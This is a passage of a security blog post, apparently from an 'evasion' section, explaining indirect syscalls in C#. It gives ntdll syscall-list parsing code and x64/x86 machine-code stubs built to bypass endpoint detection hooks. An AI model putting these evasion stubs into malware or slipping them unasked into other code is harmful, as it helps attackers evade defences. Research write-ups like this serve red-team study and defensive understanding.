</span></span><span class="highlight-line"><span class="highlight-line-content">		{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			0x64, 0xA1, 0xC0, 0x00, 0x00, 0x00,		// mov eax, fs:[0xc0]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			0x85, 0xC0, 							// test eax, eax<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			0x75, 0x06,								// jump if wow64<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			0xB8, 0x00, 0x00, 0x00, 0x00, 			// mov eax, 0<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			0xC3,									// ret<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			0xB8, 0x01, 0x00, 0x00, 0x00, 			// mov eax, 1<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			0xC3									// ret<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		IntPtr iswow64 = SharpASM.callASM(checkiswow64);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		if (iswow64.ToInt64() == 1)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			return true;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		else<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			return false;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#endif<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">public static bool PopulateSyscallList(IntPtr moduleBase)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	// Check if it is wow64<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	bool wow64 = System.Environment.Is64BitOperatingSystem &amp;&amp; !System.Environment.Is64BitProcess;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	// Check if is a syscall<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	if (functionName.StartsWith("Zw"))<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		var functionOrdinal = Marshal.ReadInt16((IntPtr)(moduleBase.ToInt64() + ordinalsRva + i * 2)) + ordinalBase;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		var functionRva = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + functionsRva + 4 * (functionOrdinal - ordinalBase)));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		functionPtr = (IntPtr)((long)moduleBase + functionRva);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		Temp_Entry.Hash = HashSyscall(functionName);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		Temp_Entry.Address = functionPtr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#if WIN64<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		Temp_Entry.SyscallAddress = SC_Address(functionPtr);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#else<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		// If wow64, skip syscall instruction search<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		if (iswow64())<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			Temp_Entry.SyscallAddress = IntPtr.Zero;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		else<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			Temp_Entry.SyscallAddress = SC_Address(functionPtr);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#endif<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		// Add syscall to the list<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		SyscallList.Add(Temp_Entry);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Once the syscall list is populated, the GetSyscallAddress function will be used to randomly select a syscall address from the syscall entry list every time I want to execute a syscall.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_198qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">public static IntPtr GetSyscallAddress(string FunctionHash)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	var hModule = GetPebLdrModuleEntry("ntdll.dll");<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	if (!PopulateSyscallList(hModule)) return IntPtr.Zero;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	Random rnd = new Random();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	DWORD index = rnd.Next() % SyscallList.Count;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	return SyscallList[index].SyscallAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Apart from the function to populate list of syscall address for indirect syscall. Updating the syscall stub assembly is also required.</p><h2 id="syscall-stub-for-indirect-syscall-in-x64" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp#syscall-stub-for-indirect-syscall-in-x64"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_5d8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_5d8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Syscall Stub For Indirect Syscall in x64</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Unlike the SysWhispers2/3 syscall stub implementation, the CSharp version of syscall stub will not call the getSyscallNumber and getSyscallAddress functions in the assembly code. Instead, these functions will be executed separately and update the stub template afterward. Therefore, there is no need to handle the CPU registers since the stack is not changed.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The updated syscall stub will now assign a randomly generated NTDLL syscall address to R11 followed by a jump instruction to achieve indirect syscall. The x64 syscall stub will be as simple as below:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_1j8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">static byte[] newSyscallStub =<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0x4C, 0x8B, 0xD1,               			    // mov r10, rcx<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0xB8, 0x18, 0x00, 0x00, 0x00,    	              	    // mov eax, syscall number<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0x49, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // movabs r11,syscall address<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0x41, 0xFF, 0xE3 				       	    // jmp r11<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">};</span></span></code></pre></div><!--/$--><h2 id="syscall-stub-for-indirect-syscall-in-x86" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp#syscall-stub-for-indirect-syscall-in-x86"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_5l8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_5l8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Syscall Stub For Indirect Syscall in x86</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">For x86 syscall stub, it will be a little bit more complicated than x64 since the syscall stub needs to be changed to support running syscall on both 32-bit OS and 64-bit OS (wow64).</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The original syscall stub from SharpWhispers as shown below supports only x86 execution in 64-bit OS by calling fs:[C0] (KiFastSystemCall).</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_1t8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">static byte[] originalSyscallStub =<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0x55,                                       // push ebp<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0x8B, 0xEC,                                 // mov ebp,esp <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0xB9, 0xAB, 0x00, 0x00, 0x00,               // mov ecx,AB   ; number of parameters<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                                                        // push_argument:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0x49,                                       // dec ecx<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0xFF, 0x74, 0x8D, 0x08,                     // push dword ptr ss:[ebp+ecx*4+8] ; parameter<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0x75, 0xF9,                                 // jne &lt;x86syscallasm.push_argument&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                                                        // ; push ret_address_epilog<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0xE8, 0x00, 0x00, 0x00, 0x00,               // call &lt;x86syscallasm.get_eip&gt; ; get eip with ret-pop <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0x58,                                       // pop eax<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0x83, 0xC0, 0x15,                           // add eax,15   ; Push return address<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0x50,                                       // push eax  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0xB8, 0xCD, 0x00, 0x00, 0x00,               // mov eax,CD ; Syscall number<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                                                        // ; Get Address from TIB<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00,   // call dword ptr fs:[C0] ; call KiFastSystemCall<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0x8D, 0x64, 0x24, 0x04,                     // lea esp,dword ptr ss:[esp+4]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                                                        // ret_address_epilog:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0x8B, 0xE5,                                 // mov esp,ebp<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0x5D,                                       // pop ebp<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">            0xC3                                        // ret<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">};</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">However, the existing stub does not support 32-bit OS since 32-bit OS Windows executes syscall differently. Thus another instruction called "sysenter" will be used, which is an instruction similar to "syscall" for x86 syscall execution. The instruction can be easier inspected from the WinDBG in 32 bit OS.</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252FbFDrr9L4JceY9lQBIpJq%252Fimage.png%3Falt%3Dmedia%26token%3Dded3aebd-fd85-468f-8e17-0e133aeb9394&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=138ac768&amp;sv=2" width="1426" height="464"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">In order to support both 32/64 bit OS execution, the syscall stub will be re-structured to first determine if it is wow64 and redirect to proper instructions to execute syscall. </p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The x86 syscall stub will be separated in few parts. Firstly, the syscall number will be assigned to EAX register.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_278qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">0xB8, 0xFF, 0x00, 0x00, 0x00,			// mov eax, syscall number</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Referring to SysWhispers2, a test will be conducted to validate if fs:[C0] exists to determine the architecture of the operating system (32/64bit).</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2b8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">0x64, 0x8B, 0x0D, 0xC0, 0x00, 0x00, 0x00, 	// mov ecx, dword ptr fs:[C0]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0x85, 0xC9,					// test ecx, ecx<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0x75, 0x0f,					// jne 18 &lt;wow64&gt;</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The TEB 0xC0 offset will show different result depending on the architecture of the OS.</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><picture class="relative"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit mx-auto"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252F2AsfmdfZHEuvvvzY3MgA%252Fimage.png%3Falt%3Dmedia%26token%3D6044bcb8-23e5-4302-86e8-32b7253fabcb&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=35734757&amp;sv=2" width="784" height="408"></div><figcaption class="text-xs text-center text-tint mt-2">x86 process in 64-bit OS</figcaption></picture></div></div></div><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute 